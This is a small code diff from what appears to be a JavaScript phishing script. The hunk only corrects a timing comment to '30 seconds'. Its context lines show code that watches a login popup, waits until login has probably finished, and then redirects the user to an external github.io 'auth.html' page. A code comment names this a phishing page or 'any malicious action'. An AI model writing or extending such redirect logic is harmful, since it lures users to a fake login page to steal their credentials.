@@ -15,7 +15,7 @@
 
                     // Assume the window was closed after login if it stays open for a reasonable time
                     const elapsedTime = Date.now() - childWindow.startTime;
-                    if (elapsedTime > 30000) { // Example: 3 seconds threshold
+                    if (elapsedTime > 30000) { // Example: 30 seconds threshold
                         console.log("Login likely completed, redirecting user...");
                         // Redirect user to phishing page or take any malicious action
                         window.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
